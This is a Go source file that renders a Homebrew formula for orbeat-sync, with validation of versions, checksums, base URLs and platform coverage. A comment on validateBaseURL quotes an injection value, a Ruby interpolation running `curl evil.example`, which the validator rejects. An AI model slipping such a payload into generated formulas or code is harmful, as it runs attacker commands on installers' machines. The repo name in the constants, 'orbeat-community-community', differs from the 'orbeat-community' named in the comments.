// Package brewformula renders the Homebrew formula that installs orbeat-sync
// from orbeat-community's GitHub Releases. It targets the public repo, not
// the private orbeat repo whose own releases exist: an unauthenticated GET
// of a private-repo release asset 404s (verified against the real v1.24.0
// release), so a `brew install` run by anyone but the owner would fail
// against that host. Task 2's re-publishing script puts the same binaries
// onto orbeat-community; this package only renders the formula that points
// at them.
//
// Rendering is pure: no network calls, and no filesystem access beyond what
// a test needs for its own fixtures. cmd/brewformula owns all I/O (reading
// checksums.txt, writing the formula) and calls into this package with
// already-loaded bytes.
//
// Two things here were settled empirically against the locally installed
// brew 6.0.18, not by reading docs, because the docs do not say either way:
//
//   - Whether url/sha256 may be nested inside on_macos/on_linux/on_arm/
//     on_intel blocks. Nesting them directly under on_macos LOOKS correct and
//     even evaluates correctly - `brew info --json=v2` returns the right URL
//     and checksum for the host's actual OS/arch - but `brew style` rejects
//     it: RuboCop's FormulaAudit/ComponentsOrder cop enumerates exactly what
//     on_macos/on_linux may directly contain, and url/sha256 are not on that
//     list. Nesting an on_arm block one level deeper and putting url/sha256
//     there instead (mirroring the on_linux/on_arm/on_intel shape this
//     formula already needs for its two Linux architectures) passed
//     `brew style` with zero offenses.
//   - Whether an explicit `version "X.Y.Z"` line coexists with a
//     `brew audit` that also scans the version out of the URL. It does not:
//     `resource_auditor.rb`'s audit_version compares the STATED version
//     against Version.detect(url!) and reports "is redundant with version
//     scanned from URL" as a real audit failure (exit 1), not a style nit,
//     whenever they match - which they always will here, since the URL
//     always encodes the same release tag. The formula below has no
//     explicit version statement; Homebrew infers it from the url, and
//     `version.to_s` in the test block resolves to the same bare string
//     either way (confirmed via `brew info --json=v2`'s "versions" field).
//
// macOS is Apple-Silicon only: an Intel install is refused by an on_intel
// block that calls odie with the reason (Apple's own retirement of Intel
// macOS, Homebrew's own retirement of Intel support) and a source-install
// fallback. That refusal was confirmed live with
// `brew audit --formula --os macos --arch intel` (Homebrew's
// simulated-platform flag), the only way to exercise that branch on an
// arm64 development machine. `depends_on arch: :arm64` stays alongside it
// for Homebrew's own dependency metadata (it surfaces in `brew info`), but
// its own message ("The arm64 architecture is required for this software")
// names neither the reason nor the fallback, so it cannot stand in for the
// odie message on its own.
//
// The template below fills three hardcoded, named platform slots (one
// macOS-arm slot, two Linux slots) rather than looping generically over
// Platforms(). Two checks close the gap that shape leaves open in each
// direction: requirePlatform errors if Platforms() ever drops one of the
// three slots this template hardcodes (which would otherwise render an
// empty `sha256 ""` with no error), and verifyCoverage errors, after
// rendering, if Platforms() ever grows past what the template covers (which
// would otherwise render a formula that silently omits the new platform).
package brewformula

import (
	"fmt"
	"regexp"
	"strings"
	"text/template"
)

// DefaultBaseURL is the GitHub Releases download root used when
// Options.BaseURL is empty.
const DefaultBaseURL = "https://github.com/stefanocalabrese/orbeat-community-community/releases/download"

const (
	formulaDesc     = "Sync client for the orbeat governed AI-capability catalog"
	formulaHomepage = "https://github.com/stefanocalabrese/orbeat-community-community"
	formulaLicense  = "Apache-2.0"

	// intelFallbackCmd is the source-install path offered to a refused Intel
	// Mac: orbeat-community's source is public, so `go install` needs no
	// release asset at all and works regardless of what this formula covers.
	intelFallbackCmd = "go install github.com/stefanocalabrese/orbeat-community-community/cmd/orbeat-sync@latest"
)

// semver matches a bare X.Y.Z version: exactly three dot-separated numeric
// components, no "v" prefix, no pre-release or build metadata suffix. This
// is narrower than full semver, and it is a POLICY choice about what this
// generator will build a Homebrew formula FOR, not a claim about what this
// project releases: release.yml has an explicit prerelease path
// (`prerelease: contains(github.ref_name, '-')`), and rc tags have been cut
// and used for real dry runs (v1.19.0's rc.0 through rc.3). Homebrew installs
// are for stable releases only, so brewformula refuses to build a formula
// for an rc or any other non-X.Y.Z tag - that is a decision about this
// generator's scope, not a false claim that such a tag has never existed.
var semver = regexp.MustCompile(`^[0-9]+\.[0-9]+\.[0-9]+$`)

// sha256Hex matches exactly 64 lowercase hex characters. sha256sum never
// emits uppercase, so requiring lowercase catches a hand-edited or
// wrong-encoding checksum rather than accepting it silently.
var sha256Hex = regexp.MustCompile(`^[0-9a-f]{64}$`)

// baseURLScheme requires an http(s) URL. Combined with the "#" rejection in
// validateBaseURL, this bounds what a caller-supplied BaseURL can contain
// before it reaches the Ruby template.
var baseURLScheme = regexp.MustCompile(`^https?://`)

// Options parameterizes formula generation.
type Options struct {
	// Version is the release version, as either "v1.26.0" or "1.26.0".
	Version string
	// BaseURL is the release-assets download root (a trailing slash is
	// tolerated). Empty uses DefaultBaseURL.
	BaseURL string
	// Checksums must have one entry per Platforms(), each a 64-lowercase-hex
	// SHA-256 of that platform's release asset.
	Checksums map[Platform]string
}

// normalizeVersion accepts "v1.26.0" or "1.26.0", strips exactly one leading
// "v", and returns the bare form. It rejects anything that is not a bare
// X.Y.Z version after that single strip - including a second leading "v",
// which normalizeVersion does not remove.
func normalizeVersion(v string) (string, error) {
	bare := strings.TrimPrefix(v, "v")
	if !semver.MatchString(bare) {
		return "", fmt.Errorf("brewformula: version %q is not a valid vX.Y.Z or X.Y.Z release version", v)
	}
	return bare, nil
}

// validateBaseURL rejects a BaseURL that could break out of the Ruby
// double-quoted string literal it is interpolated into via %q. Go's %q
// escapes Go/Ruby-meaningful characters like `"` and `\`, but it has no
// concept of Ruby string interpolation: a base URL containing "#{...}"
// passes %q completely unescaped and becomes live Ruby interpolation in the
// generated formula (e.g. "#{`curl evil.example`}"). Rejecting any "#" is
// simpler and stricter than trying to allow a literal "#" while blocking
// "#{" - a base URL has no legitimate reason to contain either.
func validateBaseURL(base string) error {
	if !baseURLScheme.MatchString(base) {
		return fmt.Errorf("brewformula: base URL %q must start with http:// or https://", base)
	}
	if strings.Contains(base, "#") {
		return fmt.Errorf(
			"brewformula: base URL %q must not contain \"#\": it is interpolated into a Ruby "+
				"double-quoted string via %%q, which does not escape Ruby's \"#{...}\" interpolation syntax",
			base)
	}
	return nil
}

// requirePlatform returns Platform{GOOS: goos, GOARCH: arch} if Platforms()
// actually names it, and an error otherwise. The three call sites in Render
// encode this Ruby template's fixed shape (one macOS-arm slot, two Linux
// slots): if Platforms() ever drops one of those three, a bare
// Platform{GOOS: goos, GOARCH: arch} literal would still look valid to the
// Go compiler and opts.Checksums[p] would silently return "" (no longer
// required by Render's own completeness loop, since that loop only iterates
// Platforms()), rendering `sha256 ""` with no error. requirePlatform turns
// that divergence into a generator error instead.
func requirePlatform(goos, arch string) (Platform, error) {
	p := Platform{GOOS: goos, GOARCH: arch}
	for _, known := range Platforms() {
		if known == p {
			return p, nil
		}
	}
	return Platform{}, fmt.Errorf(
		"brewformula: %s/%s is not in Platforms(), but the formula template requires it", goos, arch)
}

type templateData struct {
	Desc             string
	Homepage         string
	License          string
	IntelFallbackCmd string
	DarwinArm64URL   string
	DarwinArm64SHA   string
	LinuxArm64URL    string
	LinuxArm64SHA    string
	LinuxAmd64URL    string
	LinuxAmd64SHA    string
}

// formulaTemplate is the Homebrew formula body. Its shape (on_arm nested
// under on_macos and under on_linux, no bare url/sha256 directly under
// on_macos or on_linux, no explicit version statement) is exactly what
// passed `brew style` and `brew audit` with zero findings on brew 6.0.18 -
// see the package doc comment for what was tried and rejected.
const formulaTemplate = `class OrbeatSync < Formula
  desc {{printf "%q" .Desc}}
  homepage {{printf "%q" .Homepage}}
  license {{printf "%q" .License}}

  on_macos do
    depends_on arch: :arm64

    on_intel do
      odie <<~EOS
        orbeat-sync does not support Intel macOS: Apple's macOS Tahoe 26 is the
        last Intel-compatible macOS release, and Homebrew is retiring x86_64
        macOS support. Install from source instead:
          {{.IntelFallbackCmd}}
      EOS
    end

    on_arm do
      url {{printf "%q" .DarwinArm64URL}}
      sha256 {{printf "%q" .DarwinArm64SHA}}
    end
  end

  on_linux do
    on_arm do
      url {{printf "%q" .LinuxArm64URL}}
      sha256 {{printf "%q" .LinuxArm64SHA}}
    end

    on_intel do
      url {{printf "%q" .LinuxAmd64URL}}
      sha256 {{printf "%q" .LinuxAmd64SHA}}
    end
  end

  def install
    bin.install Dir["orbeat-sync-*"].first => "orbeat-sync"
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/orbeat-sync --version")
  end
end
`

var parsedFormulaTemplate = template.Must(template.New("orbeat-sync.rb").Parse(formulaTemplate))

// verifyCoverage checks the RENDERED text (not the input Options) for an
// entry naming every platform Platforms() lists, with that platform's own
// checksum on the line immediately after its url line - the same pairing
// TestRenderContent checks by hand for the three hardcoded template fields,
// generalized here over whatever Platforms() actually returns. This is what
// makes "every platform is covered" true by construction rather than by
// coincidence between two independently maintained lists: the template
// above fills exactly three named fields, so if Platforms() ever grows a
// fourth platform without a matching template change, the per-input
// checksum-completeness loop in Render would still pass (it only requires a
// checksum to be SUPPLIED, not that the template USES it), and only this
// post-render check would catch the omission.
func verifyCoverage(rendered, base, version string, checksums map[Platform]string) error {
	for _, p := range Platforms() {
		name := AssetName(p)
		url := fmt.Sprintf("%s/v%s/%s", base, version, name)
		urlLine := fmt.Sprintf("url %q", url)
		shaLine := fmt.Sprintf("sha256 %q", checksums[p])

		idx := strings.Index(rendered, urlLine)
		if idx < 0 {
			return fmt.Errorf("brewformula: rendered formula does not mention asset %s", name)
		}
		// after starts with the newline ending the url line itself, so the
		// NEXT line is SplitN's second element, not the (empty) text before
		// that first newline.
		after := rendered[idx+len(urlLine):]
		parts := strings.SplitN(after, "\n", 3)
		if len(parts) < 2 {
			return fmt.Errorf("brewformula: rendered formula's url line for %s has no following line", name)
		}
		if nextLine := strings.TrimSpace(parts[1]); nextLine != shaLine {
			return fmt.Errorf(
				"brewformula: rendered formula's checksum for %s is not on the line immediately "+
					"after its url (got %q, want %q)", name, nextLine, shaLine)
		}
	}
	return nil
}

// Render returns the complete orbeat-sync.rb formula for opts.
func Render(opts Options) (string, error) {
	version, err := normalizeVersion(opts.Version)
	if err != nil {
		return "", err
	}

	base := opts.BaseURL
	if base == "" {
		base = DefaultBaseURL
	}
	base = strings.TrimSuffix(base, "/")
	if err := validateBaseURL(base); err != nil {
		return "", err
	}

	// Validate that every platform Platforms() names has a present,
	// well-formed checksum in the INPUT. This does not by itself guarantee
	// the rendered OUTPUT covers every one of them - see verifyCoverage,
	// which checks that separately after the template executes - nor does it
	// guarantee the three platforms this template hardcodes below are still
	// among Platforms() - see requirePlatform, which checks that instead.
	for _, p := range Platforms() {
		sum, ok := opts.Checksums[p]
		if !ok {
			return "", fmt.Errorf("brewformula: missing checksum for %s", AssetName(p))
		}
		if !sha256Hex.MatchString(sum) {
			return "", fmt.Errorf("brewformula: checksum for %s is not 64 lowercase hex characters: %q",
				AssetName(p), sum)
		}
	}

	darwinArm64, err := requirePlatform("darwin", "arm64")
	if err != nil {
		return "", err
	}
	linuxArm64, err := requirePlatform("linux", "arm64")
	if err != nil {
		return "", err
	}
	linuxAmd64, err := requirePlatform("linux", "amd64")
	if err != nil {
		return "", err
	}

	assetURL := func(p Platform) string {
		return fmt.Sprintf("%s/v%s/%s", base, version, AssetName(p))
	}

	data := templateData{
		Desc:             formulaDesc,
		Homepage:         formulaHomepage,
		License:          formulaLicense,
		IntelFallbackCmd: intelFallbackCmd,
		DarwinArm64URL:   assetURL(darwinArm64),
		DarwinArm64SHA:   opts.Checksums[darwinArm64],
		LinuxArm64URL:    assetURL(linuxArm64),
		LinuxArm64SHA:    opts.Checksums[linuxArm64],
		LinuxAmd64URL:    assetURL(linuxAmd64),
		LinuxAmd64SHA:    opts.Checksums[linuxAmd64],
	}

	var b strings.Builder
	if err := parsedFormulaTemplate.Execute(&b, data); err != nil {
		return "", fmt.Errorf("brewformula: render template: %w", err)
	}
	out := b.String()

	if err := verifyCoverage(out, base, version, opts.Checksums); err != nil {
		return "", err
	}
	return out, nil
}
